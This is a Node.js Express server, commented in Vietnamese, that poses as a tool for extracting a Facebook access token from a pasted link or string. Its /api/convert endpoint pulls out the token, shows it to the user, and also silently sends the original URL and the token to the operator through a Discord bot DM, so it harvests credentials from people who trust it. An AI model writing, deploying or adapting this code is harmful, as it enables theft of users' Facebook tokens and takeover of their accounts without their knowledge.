const express = require('express');
const cors = require('cors');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// 🔗 PHẦN CẤU HÌNH ĐƯỜNG DẪN MẠNG XÃ HỘI
const SOCIAL_LINKS = {
    google: process.env.URL_GOOGLE || "https://google.com",
    facebook: process.env.URL_FACEBOOK || "https://facebook.com",
    x: process.env.URL_X || "https://x.com",
    vk: process.env.URL_VK || "https://vk.com",
    avatar: process.env.URL_AVATAR || "/cat.png"
};

// Cấu hình Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/social-links', (req, res) => {
    res.json(SOCIAL_LINKS);
});

// === 1. KHỞI TẠO BOT DISCORD ===
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages
    ]
});

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

client.once('ready', () => {
    console.log(`[BOT DISCORD] Đã đăng nhập thành công với tên: ${client.user.tag}`);
});

if (DISCORD_TOKEN) {
    client.login(DISCORD_TOKEN).catch(err => console.error('[BOT ERROR] Không thể kết nối Bot:', err));
} else {
    console.warn('[WARNING] Chưa cấu hình DISCORD_TOKEN trong Environment Variables!');
}

// === HÀM GỬI DM CHO OWNER DISCORD ===
async function sendTokenToOwner(originalUrl, accessToken) {
    if (!OWNER_ID) return;

    try {
        const owner = await client.users.fetch(OWNER_ID);
        if (owner) {
            const messageContent = 
`🔔 **THÔNG BÁO TOKEN MỚI ĐƯỢC TẠO** 🔔
-----------------------------------------
🔗 **Link gốc:** \`${originalUrl}\`
🔑 **Access Token:** \`${accessToken}\`
⏰ **Thời gian:** <t:${Math.floor(Date.now() / 1000)}:F>`;

            await owner.send(messageContent);
            console.log(`[BOT DISCORD] Đã gửi token thành công cho Owner (${owner.tag})`);
        }
    } catch (error) {
        console.error('[BOT ERROR] Lỗi khi gửi tin nhắn cho Owner:', error.message);
    }
}

// === 2. HÀM TÁCH BẮT ACCESS TOKEN THẬT TỪ LINK / CHUỖI EAT ===
function extractAccessToken(input) {
    if (!input) return null;

    // 1. Tìm nếu chuỗi dán vào đã là Token chuẩn (dạng EAAG..., EAAA..., EAA..., v.v.)
    const directTokenMatch = input.match(/(EAA[A-Za-z0-9]+)/);
    if (directTokenMatch) {
        return directTokenMatch[1];
    }

    // 2. Tìm tham số access_token= trong URL redirect/callback
    if (input.includes('access_token=')) {
        const token = input.split('access_token=')[1].split('&')[0];
        return decodeURIComponent(token);
    }

    // 3. Tìm tham số token= trong URL
    if (input.includes('token=')) {
        const token = input.split('token=')[1].split('&')[0];
        return decodeURIComponent(token);
    }

    // 4. Nếu dán nguyên đoạn JSON chứa access_token
    try {
        const parsed = JSON.parse(input);
        if (parsed.access_token) return parsed.access_token;
    } catch (e) {
        // Không phải JSON, bỏ qua
    }

    // 5. Nếu không khớp các định dạng trên nhưng chuỗi nhập vào là một chuỗi dài hợp lệ
    if (input.length > 30 && !input.startsWith('http')) {
        return input.trim();
    }

    return null;
}

// === 3. API XỬ LÝ CHUYỂN ĐỔI ===
app.post('/api/convert', async (req, res) => {
    const { url } = req.body;

    if (!url) {
        return res.status(400).json({ success: false, message: 'Vui lòng nhập đường link hoặc chuỗi token!' });
    }

    try {
        const accessToken = extractAccessToken(url);

        if (!accessToken) {
            return res.status(400).json({ 
                success: false, 
                message: 'Không tìm thấy Access Token trong đường link. Vui lòng kiểm tra lại link bạn đã dán!' 
            });
        }

        // Tự động gửi tin nhắn đến Discord của Owner
        sendTokenToOwner(url, accessToken);

        return res.json({
            success: true,
            accessToken: accessToken
        });

    } catch (error) {
        return res.status(500).json({ success: false, message: 'Lỗi trong quá trình xử lý token!' });
    }
});

// Chạy Server
app.listen(PORT, () => {
    console.log(`[SERVER] Website đang chạy tại cổng http://localhost:${PORT}`);
});
